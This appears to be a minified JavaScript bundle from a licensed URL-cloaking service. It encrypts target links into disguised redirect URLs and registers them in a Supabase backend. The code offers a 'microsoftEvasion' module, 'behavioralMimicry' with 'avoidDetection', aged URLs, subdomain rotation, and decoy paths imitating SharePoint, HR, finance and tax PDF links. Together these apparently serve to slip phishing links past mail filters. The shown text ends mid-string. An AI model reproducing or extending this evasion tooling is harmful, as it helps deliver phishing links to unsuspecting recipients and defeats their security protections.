t=process.version.match(/^v(\d+)\./);return t?parseInt(t[1],10)<=18:!1}L3()&&console.warn("  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217");const M3="https://vohjarhfvaphzwjzjcnz.supabase.co",O3="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZvaGphcmhmdmFwaHp3anpqY256Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTIzMzQ2NzksImV4cCI6MjA2NzkxMDY3OX0.fTMJcBvsRKH_hge7Q1zvh8GSRLt-egCG6W9Mz6JavMQ",$=I3(M3,O3,{auth:{storage:localStorage,persistSession:!0,autoRefreshToken:!0}}),$3=Object.freeze(Object.defineProperty({__proto__:null,supabase:$},Symbol.toStringTag,{value:"Module"}));class U3{constructor(){re(this,"keyCache",new Map);re(this,"CACHE_DURATION",30*60*1e3)}async getLicenseKey(){const e=localStorage.getItem("license_session_token");if(!e)throw new Error("Authentication required - please log in with your license key");const{data:r,error:n}=await $.rpc("validate_session_with_license",{session_token_input:e});if(n||!(r!=null&&r.valid)||!(r!=null&&r.license_key))throw new Error("Session invalid - please log in again");return r.license_key}async getSecureKey(e){const r=`${e}-${Math.floor(Date.now()/this.CACHE_DURATION)}`,n=this.keyCache.get(r);if(n&&n.expires>Date.now())return n.key;try{const s=await this.getLicenseKey(),{data:i,error:o}=await $.functions.invoke("secure-key-derivation",{body:{license_key:s,context:e,operation:"derive"}});if(o||!(i!=null&&i.success)||!(i!=null&&i.derived_key))throw new Error((i==null?void 0:i.error)||"Server-side key derivation failed");return this.keyCache.set(r,{key:i.derived_key,expires:Date.now()+this.CACHE_DURATION}),i.derived_key}catch(s){throw new Error(`Secure key retrieval failed: ${s instanceof Error?s.message:"Unknown error"}`)}}toBase64Url(e){return btoa(String.fromCharCode(...new Uint8Array(e))).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}fromBase64Url(e){const r=e.replace(/-/g,"+").replace(/_/g,"/"),n="=".repeat((4-r.length%4)%4),s=atob(r+n),i=new Uint8Array(s.length);for(let o=0;o<s.length;o++)i[o]=s.charCodeAt(o);return i.buffer}async encrypt(e,r="url"){try{const n=await this.getLicenseKey(),{data:s,error:i}=await $.functions.invoke("secure-key-derivation",{body:{license_key:n,context:r,operation:"encrypt",data:e}});if(i||!(s!=null&&s.success)||!(s!=null&&s.encrypted_data))throw new Error((s==null?void 0:s.error)||"Server-side encryption failed");return{ciphertext:s.encrypted_data,success:!0}}catch(n){return{ciphertext:"",success:!1,error:`Secure encryption failed: ${n instanceof Error?n.message:"Unknown error"}`}}}async decrypt(e,r="url"){try{const n=await this.getLicenseKey(),{data:s,error:i}=await $.functions.invoke("secure-key-derivation",{body:{license_key:n,context:r,operation:"decrypt",data:e}});if(i||!(s!=null&&s.success)||!(s!=null&&s.decrypted_data))throw new Error((s==null?void 0:s.error)||"Server-side decryption failed");return{plaintext:s.decrypted_data,success:!0}}catch(n){return{plaintext:"",success:!1,error:`Secure decryption failed: ${n instanceof Error?n.message:"Unknown error"}`}}}async hybridEncrypt(e,r="url"){try{const n=await this.getSecureKey(r),i=new TextEncoder().encode(e),o=this.fromBase64Url(n),l=await crypto.subtle.importKey("raw",o,{name:"AES-GCM"},!1,["encrypt"]),c=crypto.getRandomValues(new Uint8Array(12)),d=crypto.getRandomValues(new Uint8Array(16)),u=await crypto.subtle.encrypt({name:"AES-GCM",iv:c,additionalData:d},l,i),h={ciphertext:this.toBase64Url(u.slice(0,-16)),nonce:this.toBase64Url(c),salt:this.toBase64Url(d),timestamp:Date.now(),authTag:this.toBase64Url(u.slice(-16))};return`${h.ciphertext}.${h.nonce}.${h.salt}.${h.timestamp}.${h.authTag}`}catch(n){throw new Error(`Hybrid encryption failed: ${n instanceof Error?n.message:"Unknown error"}`)}}async hybridDecrypt(e,r="url"){try{const n=e.split(".");if(n.length!==5)throw new Error("Invalid encrypted data format");const[s,i,o,l,c]=n,d=this.fromBase64Url(s),u=new Uint8Array(this.fromBase64Url(i)),h=new Uint8Array(this.fromBase64Url(o)),f=parseInt(l),m=new Uint8Array(this.fromBase64Url(c)),g=7*24*60*60*1e3;if(Date.now()-f>g)throw new Error("Encrypted data has expired");const v=await this.getSecureKey(r),w=this.fromBase64Url(v),y=await crypto.subtle.importKey("raw",w,{name:"AES-GCM"},!1,["decrypt"]),x=new Uint8Array(d.byteLength+m.length);x.set(new Uint8Array(d)),x.set(m,d.byteLength);const b=await crypto.subtle.decrypt({name:"AES-GCM",iv:u,additionalData:h},y,x);return new TextDecoder().decode(b)}catch(n){throw new Error(`Hybrid decryption failed: ${n instanceof Error?n.message:"Unknown error"}`)}}clearCache(){this.keyCache.clear()}cleanupExpiredKeys(){const e=Date.now();for(const[r,n]of this.keyCache.entries())n.expires<=e&&this.keyCache.delete(r)}}const Fi=new U3;Fi.hybridEncrypt.bind(Fi);Fi.hybridDecrypt.bind(Fi);class D3{async decodeStealthUrl(e,r,n){if(console.log(" Starting decoding for data:",e),ju(e)){console.log(" Detected Base34 format, trying custom decryption");try{const s=await this.tryCustomDecryption(e);if(s)return console.log(" Base34 custom decryption successful:",s),{originalUrl:s,decryptionMode:"xor",isValid:!0,metadata:{base34Decryption:!0}}}catch(s){console.log(" Base34 custom decryption failed:",s)}}else console.log(" Not Base34 format, skipping custom decryption");try{const s=Ur.detectEncryptionMode(e);console.log(" Detected encryption mode:",s);try{const i=await Ur.decryptUrl(e,r,s);return console.log(" Standard decryption successful:",i),{originalUrl:i,decryptionMode:s,isValid:!0,metadata:{detectedMode:!0}}}catch{console.log(" Standard decryption failed, trying alternative mode");const o=s==="aes"?"xor":"aes";try{const l=await Ur.decryptUrl(e,r,o);return console.log(" Alternative decryption successful:",l),{originalUrl:l,decryptionMode:o,isValid:!0,metadata:{fallbackMode:!0}}}catch{console.log(" Alternative decryption failed, trying XOR");const l=await Tl(e,r);return console.log(" XOR decryption result:",l),{originalUrl:l,decryptionMode:"xor",isValid:!0,metadata:{directXOR:!0}}}}}catch(s){return console.log(" All standard decryption methods failed"),{originalUrl:"",decryptionMode:"xor",isValid:!1,metadata:{error:s.message}}}}async tryCustomDecryption(e){try{console.log(` [StealthDecoder] Trying custom decryption on: ${e.substring(0,50)}...`);try{if(ju(e)){const r=Cl(e);if(console.log(` [StealthDecoder] Base34 decoded: ${r.substring(0,100)}...`),this.isValidUrl(r))return console.log(` [StealthDecoder] Direct URL found via Base34: ${r}`),r;if(r.includes(".")&&r.split(".").length>=3){console.log(" [StealthDecoder] Detected Base34 structured data");const n=r.split(".");for(let s=0;s<n.length;s++){const i=n[s];if(this.isValidUrl(i))return console.log(` [StealthDecoder] Found valid URL in Base34 part ${s}: ${i}`),i}}}}catch(r){console.log(` [StealthDecoder] Base34 decode failed: ${r}`)}console.log(" [StealthDecoder] Base64 methods removed for security");try{const r=decodeURIComponent(e);if(this.isValidUrl(r))return console.log(` [StealthDecoder] Valid URL from URL decode: ${r}`),r}catch(r){console.log(` [StealthDecoder] URL decoding failed: ${r}`)}return console.log(` [StealthDecoder] Custom decryption failed for: ${e.substring(0,30)}...`),null}catch(r){return console.log(" Custom decryption error:",r),null}}isValidUrl(e){try{return new URL(e),e.includes("://")&&(e.startsWith("http://")||e.startsWith("https://"))}catch{return!1}}extractEncryptedData(e){try{const r=new URL(e),n=["doc","file","ref","id","token","data","content"];for(const i of n){const o=r.searchParams.get(i);if(o&&o.length>10)return o}const s=r.pathname.split("/").filter(i=>i.length>10);return s.length>0?s[s.length-1]:r.hash&&r.hash.length>10?r.hash.substring(1):null}catch{return null}}isStealthUrl(e){return this.extractEncryptedData(e)!==null}}class z3{constructor(){re(this,"cache",new Map);re(this,"maxAge",5*60*1e3);re(this,"maxSize",1e3)}set(e,r,n){this.cache.size>=this.maxSize&&this.cleanup(),this.cache.set(e,{originalUrl:r,timestamp:Date.now(),method:n})}get(e){const r=this.cache.get(e);return r?Date.now()-r.timestamp>this.maxAge?(this.cache.delete(e),null):r.originalUrl:null}cleanup(){const e=Date.now(),r=[];for(const[n,s]of this.cache.entries())e-s.timestamp>this.maxAge&&r.push(n);r.forEach(n=>this.cache.delete(n)),this.cache.size>=this.maxSize&&Array.from(this.cache.entries()).sort((i,o)=>i[1].timestamp-o[1].timestamp).slice(0,Math.floor(this.maxSize/4)).forEach(([i])=>this.cache.delete(i))}clear(){this.cache.clear()}getStats(){return{size:this.cache.size,maxSize:this.maxSize,maxAge:this.maxAge}}}const z0=new z3,Qn=class Qn{constructor(){re(this,"rateLimitCache",new Map);re(this,"rateLimits",{url_generation:{operation:"url_generation",hourlyLimit:1e3,minuteLimit:50,dailyLimit:5e3},url_access:{operation:"url_access",hourlyLimit:5e3,minuteLimit:200,dailyLimit:2e4},pattern_analysis:{operation:"pattern_analysis",hourlyLimit:100,minuteLimit:10,dailyLimit:500},key_derivation:{operation:"key_derivation",hourlyLimit:500,minuteLimit:25,dailyLimit:2e3}})}static getInstance(){return Qn.instance||(Qn.instance=new Qn),Qn.instance}async checkRateLimit(e,r,n,s){console.log(` [RateLimit] Checking rate limit for license ${e.substring(0,8)}..., operation: ${r}`);const i=this.rateLimits[r];if(!i)return console.log(` [RateLimit] Unknown operation ${r}, allowing with default limits`),{allowed:!0,remaining:1e3,resetTime:new Date(Date.now()+60*60*1e3),currentUsage:0,limit:1e3};try{console.log(` [RateLimit] Config for ${r}:`,i);const o=await this.checkHourlyLimit(e,r,i.hourlyLimit);if(console.log(" [RateLimit] Hourly check result:",o),!o.allowed)return console.warn(` [RateLimit] Hourly limit exceeded for ${r}`),await this.logRateLimitViolation(e,r,"hourly_limit",o,n,s),o;const l=await this.checkMinuteLimit(e,r,i.minuteLimit);if(console.log(" [RateLimit] Minute check result:",l),!l.allowed)return console.warn(` [RateLimit] Minute limit exceeded for ${r}`),await this.logRateLimitViolation(e,r,"minute_limit",l,n,s),l;const c=await this.checkDailyLimit(e,r,i.dailyLimit);if(console.log(" [RateLimit] Daily check result:",c),!c.allowed)return console.warn(` [RateLimit] Daily limit exceeded for ${r}`),await this.logRateLimitViolation(e,r,"daily_limit",c,n,s),c;await this.recordOperation(e,r);const d={allowed:!0,remaining:Math.min(o.remaining,l.remaining,c.remaining),resetTime:new Date(Math.min(o.resetTime.getTime(),l.resetTime.getTime(),c.resetTime.getTime())),currentUsage:Math.max(o.currentUsage,l.currentUsage,c.currentUsage),limit:i.hourlyLimit};return console.log(` [RateLimit] All checks passed for ${r}:`,d),d}catch(o){console.error("[RateLimit] Error checking rate limit:",o),await this.logRateLimitError(e,r,o);const l={allowed:!0,remaining:1e3,resetTime:new Date(Date.now()+60*60*1e3),currentUsage:0,limit:(i==null?void 0:i.hourlyLimit)||1e3,reason:"Rate limit check failed - allowing operation"};return console.log(" [RateLimit] Failed open with fallback result:",l),l}}async checkHourlyLimit(e,r,n){const s=Math.floor(Date.now()/36e5),i=`${e}_${r}_hour_${s}`,o=this.rateLimitCache.get(i),l=(o==null?void 0:o.count)||0,c=Math.max(0,n-l);return{allowed:c>0,remaining:c-1,resetTime:new Date((s+1)*60*60*1e3),currentUsage:l,limit:n,reason:c<=0?"Hourly rate limit exceeded":void 0}}async checkMinuteLimit(e,r,n){const s=Math.floor(Date.now()/6e4),i=`${e}_${r}_minute_${s}`,o=this.rateLimitCache.get(i),l=(o==null?void 0:o.count)||0,c=Math.max(0,n-l);return{allowed:c>0,remaining:c-1,resetTime:new Date((s+1)*60*1e3),currentUsage:l,limit:n,reason:c<=0?"Minute rate limit exceeded":void 0}}async checkDailyLimit(e,r,n){try{const s=new Date;s.setHours(0,0,0,0);const i=new Date(s);i.setDate(i.getDate()+1);const{data:o,error:l}=await $.from("url_registry").select("id").eq("license_key_id",e).gte("created_at",s.toISOString()).lt("created_at",i.toISOString());if(l)return console.warn("[RateLimit] Error checking daily limit, allowing operation:",l),{allowed:!0,remaining:n-1,resetTime:i,currentUsage:0,limit:n};const c=(o==null?void 0:o.length)||0,d=Math.max(0,n-c);return{allowed:d>0,remaining:d-1,resetTime:i,currentUsage:c,limit:n,reason:d<=0?"Daily rate limit exceeded":void 0}}catch(s){console.warn("[RateLimit] Daily limit check failed, allowing operation:",s);const i=new Date;return i.setDate(i.getDate()+1),i.setHours(0,0,0,0),{allowed:!0,remaining:n-1,resetTime:i,currentUsage:0,limit:n}}}async recordOperation(e,r){const n=Date.now(),s=Math.floor(n/(60*60*1e3)),i=`${e}_${r}_hour_${s}`,o=this.rateLimitCache.get(i);this.rateLimitCache.set(i,{count:((o==null?void 0:o.count)||0)+1,windowStart:s*60*60*1e3,windowEnd:(s+1)*60*60*1e3});const l=Math.floor(n/(60*1e3)),c=`${e}_${r}_minute_${l}`,d=this.rateLimitCache.get(c);this.rateLimitCache.set(c,{count:((d==null?void 0:d.count)||0)+1,windowStart:l*60*1e3,windowEnd:(l+1)*60*1e3})}async logRateLimitViolation(e,r,n,s,i,o){try{console.warn(`[RateLimit] ${n} exceeded for license ${e}, operation ${r}`);const l={license_key_id:e,operation:r,limit_type:n,current_usage:s.currentUsage,limit:s.limit,user_agent:i,ip_address:o,timestamp:new Date().toISOString()};console.log("[RateLimit] Violation details:",l)}catch(l){console.error("[RateLimit] Error logging rate limit violation:",l)}}async logRateLimitError(e,r,n){try{console.error(`[RateLimit] Error for license ${e}, operation ${r}:`,n)}catch(s){console.error("[RateLimit] Error logging rate limit error:",s)}}async getRateLimitStatus(e){const r={};for(const[n,s]of Object.entries(this.rateLimits)){const i=await this.checkHourlyLimit(e,n,s.hourlyLimit),o=await this.checkDailyLimit(e,n,s.dailyLimit);r[n]={hourly:{used:i.currentUsage,remaining:i.remaining+1,limit:i.limit,resetTime:i.resetTime},daily:{used:o.currentUsage,remaining:o.remaining+1,limit:o.limit,resetTime:o.resetTime}}}return r}clearExpiredCache(){const e=Date.now();let r=0;for(const[n,s]of this.rateLimitCache.entries())s.windowEnd<=e&&(this.rateLimitCache.delete(n),r++);r>0&&console.log(`[RateLimit] Cleared ${r} expired cache entries`)}getCacheStats(){const e=Date.now();let r=0;for(const n of this.rateLimitCache.values())n.windowEnd>e&&r++;return{total_entries:this.rateLimitCache.size,active_windows:r,memory_usage_estimate:this.rateLimitCache.size*100}}startCacheCleanup(){console.log("[RateLimit] Starting automatic cache cleanup"),setInterval(()=>{this.clearExpiredCache()},60*1e3)}updateRateLimit(e,r){this.rateLimits[e]&&(this.rateLimits[e]={...this.rateLimits[e],...r},console.log(`[RateLimit] Updated limits for ${e}:`,this.rateLimits[e]))}getRateLimits(){return{...this.rateLimits}}};re(Qn,"instance");let Lu=Qn;const Rv=Lu.getInstance(),Yn=class Yn{constructor(){re(this,"enabled",!1);re(this,"localMetrics",{totalGenerations:0,successfulGenerations:0,patternUsage:{},errorCounts:{},lastReset:new Date});re(this,"eventQueue",[]);re(this,"MAX_QUEUE_SIZE",100);this.checkAnalyticsAvailability()}static getInstance(){return Yn.instance||(Yn.instance=new Yn),Yn.instance}async checkAnalyticsAvailability(){try{const{error:e}=await $.from("url_patterns").select("id").limit(1);this.enabled=!e,this.enabled?console.log(" [OptionalAnalytics] Analytics enabled - Supabase available"):console.log(" [OptionalAnalytics] Analytics disabled - Supabase unavailable, using local metrics only")}catch{this.enabled=!1,console.log(" [OptionalAnalytics] Analytics disabled - operating in offline mode")}}async trackEvent(e,r,n="user_action"){this.updateLocalMetrics(e,r);const s={event:e,data:r,timestamp:new Date,category:n};if(this.eventQueue.push(s),this.eventQueue.length>this.MAX_QUEUE_SIZE&&this.eventQueue.shift(),this.enabled)try{await this.sendToDatabase(s)}catch(i){console.warn(" [OptionalAnalytics] Failed to send to database, continuing with local metrics:",i)}}async trackPatternUsage(e,r,n){await this.trackEvent("pattern_used",{patternId:e,patternName:r,success:n,timestamp:new Date().toISOString()},"pattern_usage")}async trackUrlGeneration(e,r,n,s){await this.trackEvent("url_generated",{success:e,pattern:r,method:n,metadata:s,timestamp:new Date().toISOString()},"url_generation")}async trackPerformance(e,r,n){await this.trackEvent("performance_metric",{operation:e,duration:r,success:n,timestamp:new Date().toISOString()},"performance")}async trackSecurityEvent(e,r){await this.trackEvent("security_event",{eventType:e,details:r,timestamp:new Date().toISOString()},"security")}updateLocalMetrics(e,r){switch(e){case"url_generated":this.localMetrics.totalGenerations++,r.success&&this.localMetrics.successfulGenerations++,r.pattern&&(this.localMetrics.patternUsage[r.pattern]=(this.localMetrics.patternUsage[r.pattern]||0)+1);break;case"pattern_used":r.patternName&&(this.localMetrics.patternUsage[r.patternName]=(this.localMetrics.patternUsage[r.patternName]||0)+1);break;case"error_occurred":r.errorType&&(this.localMetrics.errorCounts[r.errorType]=(this.localMetrics.errorCounts[r.errorType]||0)+1);break}}async sendToDatabase(e){if(this.enabled)try{const{error:r}=await $.from("analytics_events").insert({event_name:e.event,event_data:e.data,event_category:e.category,created_at:e.timestamp.toISOString()});r&&e.category==="pattern_usage"&&await this.fallbackPatternTracking(e)}catch(r){console.debug(" [OptionalAnalytics] Database insert failed:",r)}}async fallbackPatternTracking(e){try{e.data.patternId&&await $.rpc("increment_pattern_usage",{pattern_id_input:e.data.patternId})}catch(r){console.debug(" [OptionalAnalytics] Fallback tracking failed:",r)}}getLocalMetrics(){const e=this.localMetrics.totalGenerations>0?this.localMetrics.successfulGenerations/this.localMetrics.totalGenerations*100:0,r=Object.entries(this.localMetrics.patternUsage).map(([n,s])=>({pattern:n,count:s})).sort((n,s)=>s.count-n.count).slice(0,5);return{...this.localMetrics,successRate:Math.round(e),topPatterns:r}}async getComprehensiveMetrics(){const e=this.getLocalMetrics();if(!this.enabled)return{source:"local_only",...e,databaseMetrics:null};try{const{data:r,error:n}=await $.rpc("get_analytics_summary");return n||!r?{source:"local_with_db_error",...e,databaseMetrics:null,dbError:n==null?void 0:n.message}:{source:"local_and_database",localMetrics:e,databaseMetrics:r}}catch(r){return{source:"local_with_exception",...e,databaseMetrics:null,exception:r}}}resetLocalMetrics(){this.localMetrics={totalGenerations:0,successfulGenerations:0,patternUsage:{},errorCounts:{},lastReset:new Date},this.eventQueue=[]}getStatus(){return{enabled:this.enabled,queueSize:this.eventQueue.length,localMetrics:!0,lastCheck:new Date}}setEnabled(e){this.enabled=e,console.log(` [OptionalAnalytics] Analytics ${e?"enabled":"disabled"} manually`)}async flushEventQueue(){if(!this.enabled||this.eventQueue.length===0)return;const e=[...this.eventQueue];this.eventQueue=[];try{for(let n=0;n<e.length;n+=10){const s=e.slice(n,n+10);await Promise.all(s.map(i=>this.sendToDatabase(i)))}}catch(r){console.warn(" [OptionalAnalytics] Batch processing failed:",r)}}};re(Yn,"instance");let Mu=Yn;const qs=Mu.getInstance();class F3{constructor(){re(this,"stealthDecoder",new D3);re(this,"performanceMetrics",{totalProcessed:0,successfulProcessed:0,averageProcessingTime:0,methodPerformance:new Map,lastCleanup:Date.now()})}async processUrl(e,r){const n=Date.now(),s=[],i=l=>{console.log(l),s.push(l)};i(` [OptimizedProcessor] Processing URL: ${e.substring(0,50)}...`);const o=z0.get(e);if(o)return i(" [OptimizedProcessor] Cache hit - returning cached result"),this.updateMetrics("cache",n,!0),{originalUrl:o,success:!0,method:"registry",methodLogs:s};try{const l=[{name:"registry",fn:()=>this.tryRegistryLookup(e),priority:1},{name:"direct",fn:()=>this.tryDirectDecryption(e,r),priority:2},{name:"pattern",fn:()=>this.tryPatternDecryption(e,r),priority:3}];for(const c of l)try{i(` [OptimizedProcessor] Trying ${c.name} method`);const d=await this.executeWithTimeout(c.fn,5e3);if(d.success)return i(` [OptimizedProcessor] ${c.name} method successful`),this.updateMetrics(c.name,n,!0),c.name==="registry"&&z0.set(e,d.originalUrl,"registry"),{...d,methodLogs:s};i(` [OptimizedProcessor] ${c.name} method failed: ${d.error}`)}catch(d){i(` [OptimizedProcessor] ${c.name} method error: ${d}`);continue}return this.updateMetrics("all_failed",n,!1),{originalUrl:"",success:!1,method:"all_methods_failed",error:"All processing methods failed",methodLogs:s}}catch(l){return i(` [OptimizedProcessor] Critical error: ${l}`),this.updateMetrics("error",n,!1),{originalUrl:"",success:!1,method:"all_methods_failed",error:`Critical processing error: ${l}`,methodLogs:s}}}async executeWithTimeout(e,r){return new Promise((n,s)=>{const i=setTimeout(()=>{s(new Error(`Operation timed out after ${r}ms`))},r);e().then(o=>{clearTimeout(i),n(o)}).catch(o=>{clearTimeout(i),s(o)})})}updateMetrics(e,r,n){const s=Date.now()-r;this.performanceMetrics.totalProcessed++,n&&this.performanceMetrics.successfulProcessed++;const i=this.performanceMetrics.averageProcessingTime,o=this.performanceMetrics.totalProcessed;this.performanceMetrics.averageProcessingTime=(i*(o-1)+s)/o;const l=this.performanceMetrics.methodPerformance.get(e)||0;this.performanceMetrics.methodPerformance.set(e,l+1),Date.now()-this.performanceMetrics.lastCleanup>36e5&&this.cleanupMetrics()}cleanupMetrics(){if(this.performanceMetrics.totalProcessed>1e4){this.performanceMetrics.totalProcessed=Math.floor(this.performanceMetrics.totalProcessed/2),this.performanceMetrics.successfulProcessed=Math.floor(this.performanceMetrics.successfulProcessed/2);for(const[e,r]of this.performanceMetrics.methodPerformance.entries())this.performanceMetrics.methodPerformance.set(e,Math.floor(r/2))}this.performanceMetrics.lastCleanup=Date.now()}async tryRegistryLookup(e){try{const r=this.generateUrlHash(e),{data:n,error:s}=await $.rpc("get_license_from_url",{url_hash_input:r});if(!s&&n&&typeof n=="object"&&"valid"in n&&n.valid)return{originalUrl:n.original_url,success:!0,method:"registry"};const{data:i,error:o}=await $.from("url_registry").select("original_url, redirect_url").eq("url_hash",r).eq("is_active",!0).maybeSingle();return!o&&i?{originalUrl:i.original_url||i.redirect_url,success:!0,method:"registry"}:{originalUrl:"",success:!1,method:"registry",error:"URL not found in registry"}}catch(r){return{originalUrl:"",success:!1,method:"registry",error:`Registry lookup error: ${r}`}}}generateUrlHash(e){let r=0;for(let n=0;n<e.length;n++){const s=e.charCodeAt(n);r=(r<<5)-r+s,r=r&r}return Math.abs(r).toString(36)}async tryDirectDecryption(e,r){const n=this.extractEncryptedParam(e);if(!n)return{originalUrl:"",success:!1,method:"direct-xor",error:"No encrypted parameter found"};try{const s=await Tl(n,r);if(this.isValidUrl(s))return{originalUrl:s,success:!0,method:"direct-xor"}}catch{}try{const s=await Ur.decryptUrl(n,r,"aes");if(this.isValidUrl(s))return{originalUrl:s,success:!0,method:"aes"}}catch{try{const i=await Fi.decrypt(n,r);if(i.success&&this.isValidUrl(i.plaintext))return{originalUrl:i.plaintext,success:!0,method:"aes"}}catch{}}return{originalUrl:"",success:!1,method:"direct-xor",error:"All direct decryption methods failed"}}async tryPatternDecryption(e,r){try{if(this.stealthDecoder.isStealthUrl(e)){const s=await this.stealthDecoder.decodeStealthUrl(e,r);if(s.isValid&&this.isValidUrl(s.originalUrl))return{originalUrl:s.originalUrl,success:!0,method:"stealth"}}}catch{}const n=[/\/sites\/[\w\-]+\/Shared%20Documents\/[\w\-\/]+\.pdf\?[\w=&]+/,/\/personal\/[\w\-]+\/Documents\/[\w\-\/]+\.pdf\?[\w=&]+/,/\/finance\/reports\/\d{4}\/[\w\-]+\.pdf\?[\w=&]+/,/\/hr\/policies\/[\w\-]+\/\d{4}\/[\w\-]+\.pdf\?[\w=&]+/,/\/tax\/forms\/\d{4}\/[\w\-]+\.pdf\?[\w=&]+/,/\/documents\/[\w\-]+\.pdf\?[\w=&]+/];for(const s of n)if(e.match(s)){const o=this.extractEncryptedParam(e);if(o)try{const l=await Ur.decryptUrl(o,r,"aes");if(this.isValidUrl(l))return{originalUrl:l,success:!0,method:"pattern"}}catch{}}return{originalUrl:"",success:!1,method:"pattern",error:"Pattern decryption failed"}}extractEncryptedParam(e){const r=[/[?&]data=([^&]+)/,/[?&]d=([^&]+)/,/[?&]user=([^&]+)/,/[?&]session=([^&]+)/,/[?&]doc=([^&]+)/,/[?&]file=([^&]+)/,/\/e\/([^?&\/]+)/];for(const n of r){const s=e.match(n);if(s&&s[1])return decodeURIComponent(s[1])}return null}isValidUrl(e){try{return new URL(e),e.startsWith("http://")||e.startsWith("https://")}catch{return!1}}getMetrics(){return{...this.performanceMetrics}}}const Jn=class Jn{constructor(){re(this,"optimizedProcessor",new F3)}static getInstance(){return Jn.instance||(Jn.instance=new Jn),Jn.instance}async processUrl(e,r="default-license"){return await this.optimizedProcessor.processUrl(e,r)}isValidUrl(e){try{return new URL(e),e.startsWith("http://")||e.startsWith("https://")}catch{return!1}}simpleHash(e){let r=0;for(let n=0;n<e.length;n++){const s=e.charCodeAt(n);r=(r<<5)-r+s,r=r&r}return Math.abs(r).toString(36)}generateUrlHash(e,r){const n=r?`${e}:${r}`:e;return this.simpleHash(n)}async createLegacyRedirectUrl(e,r){if(console.log(" [CentralizedUrlProcessor] Creating legacy /e/ format URL"),!this.isValidUrl(e))throw new Error("Invalid target URL format");const s=`/e/${await Gn(e,r)}`;return await this.registerUrlWithRetry(s,r,e),s}async registerUrlWithRetry(e,r,n,s=5){let i=null;for(let o=0;o<s;o++)try{const l=this.generateUrlHash(e,r),{data:c,error:d}=await $.rpc("register_generated_url",{url_hash_input:l,license_key_id_input:r,pattern_name_input:"default",redirect_url_input:n,expiry_hours:720});if(!d){console.log(` [CentralizedUrlProcessor] URL registered successfully on attempt ${o+1}`);return}if(i=new Error(d.message||"Unknown registration error"),console.warn(` [CentralizedUrlProcessor] Registration attempt ${o+1} failed:`,d),o<s-1){const u=Math.pow(2,o)*1e3;await new Promise(h=>setTimeout(h,u))}}catch(l){if(i=l,console.warn(` [CentralizedUrlProcessor] Registration attempt ${o+1} error:`,l),o<s-1){const c=Math.pow(2,o)*1e3;await new Promise(d=>setTimeout(d,c))}}console.error("Database registration failed after all retries:",i==null?void 0:i.message)}async generateUnifiedUrl(e,r,n={}){const{pattern:s="auto",stealthLevel:i="planA",encryptionMode:o="auto",patternData:l,useAdvanced:c=!0,varietySeed:d=0,forceNewHash:u=!1,enableAntiDetection:h=!0,targetProvider:f="generic",useAgedUrl:m=!1,enableSubdomainRotation:g=!0}=n;if(console.log(" [CentralizedUrlProcessor] Enhanced generateUnifiedUrl called with options:",n),console.log(" [CentralizedUrlProcessor] Target URL:",e),console.log(" [CentralizedUrlProcessor] License ID:",r.substring(0,8)+"..."),!e||typeof e!="string")throw new Error("Target URL is required and must be a string");if(!r||typeof r!="string")throw new Error("License key ID is required and must be a string");if(!this.isValidUrl(e))throw new Error("Invalid target URL format");const v=await Rv.checkRateLimit(r,"url_generation",navigator.userAgent,"client-request");if(!v.allowed)throw new Error(`Rate limit exceeded: ${v.reason}. Try again in ${Math.ceil((v.resetTime.getTime()-Date.now())/6e4)} minutes.`);let w="",y={},x=!1;try{if(m)try{const{urlAging:j}=await Vt(async()=>{const{urlAging:N}=await import("./urlAging-B2EDoFH8.js");return{urlAging:N}},[]),_=await j.getAgedUrl(e,r,s);if(_)return{url:_.url,metadata:{pattern:_.pattern,tier:1,contentType:"application/pdf",expectedSuccessRate:_.reputationScore.toString(),encryptionMode:"aged",generationMethod:"aged-url",agedUrlId:_.id,usageCount:_.usageCount,reputationScore:_.reputationScore}}}catch(j){console.warn("Failed to get aged URL, continuing with fresh generation:",j)}if(s==="microsoft"||f==="microsoft")try{const{microsoftEvasion:j}=await Vt(async()=>{const{microsoftEvasion:S}=await import("./microsoftEvasion-B3KTx_V5.js");return{microsoftEvasion:S}},[]),_=j.getMicrosoftPattern(void 0,{useBusinessHours:!0,mimicLegitimateServices:!0}),N=j.generateMicrosoftParameters(_);N.encrypted=await this.generateEncryptedPayload(e,r,o),w=this.replacePlaceholders(_.template,N),y={pattern:"microsoft-evasion",tier:1,contentType:_.contentType,expectedSuccessRate:_.successRate.toString(),encryptionMode:o,generationMethod:"microsoft-specific",microsoftCategory:_.category}}catch(j){console.warn("Microsoft pattern generation failed, falling back:",j)}else if(s==="mimicry"||s==="auto"&&Math.random()>.5)try{const{behavioralMimicry:j}=await Vt(async()=>{const{behavioralMimicry:S}=await import("./behavioralMimicry-BBuROIbV.js");return{behavioralMimicry:S}},[]),_=j.selectOptimalPattern({preferHighTrust:!0,avoidDetection:!0,targetAudience:f==="microsoft"?"business":"mixed"}),N=j.generateServiceParameters(_);N.encrypted=await this.generateEncryptedPayload(e,r,o),w=this.replacePlaceholders(_.template,N),y={pattern:"behavioral-mimicry",tier:1,contentType:_.headers["Content-Type"]||"application/pdf",expectedSuccessRate:_.trustScore.toString(),encryptionMode:o,generationMethod:"behavioral-mimicry",serviceName:_.serviceName,recognitionRate:_.recognitionRate}}catch(j){console.warn("Behavioral mimicry failed, falling back:",j)}else if(!c&&s==="legacy")w=await this.createLegacyRedirectUrl(e,r),y={pattern:"legacy",tier:0,contentType:"text/html",expectedSuccessRate:"99",encryptionMode:"xor",generationMethod:"legacy"};else if(!w){console.log(" [CentralizedUrlProcessor] Using advanced pattern generation with pattern:",s);try{let j=o;o==="auto"&&(j=(n.varietySeed||0)%10<7?"aes":"xor"),console.log(" [CentralizedUrlProcessor] Using encryption mode:",j,"with variety factor:",(n.varietySeed||0)%10);let _;try{_=await Ur.encryptUrl(e,r,s,j),console.log(" [CentralizedUrlProcessor] Encryption successful:",_.mode)}catch(S){console.warn(" [CentralizedUrlProcessor] Primary encryption failed, trying XOR:",S),_={encrypted:await Gn(e,r),mode:"xor"}}let N=_.encrypted;try{(i==="planA"||i==="both")&&(N=this.applyPlanAObfuscation(N)),(i==="planB"||i==="both")&&(N=this.applyPlanBObfuscation(N)),console.log(" [CentralizedUrlProcessor] Stealth obfuscation applied")}catch(S){console.warn(" [CentralizedUrlProcessor] Stealth obfuscation failed, using plain 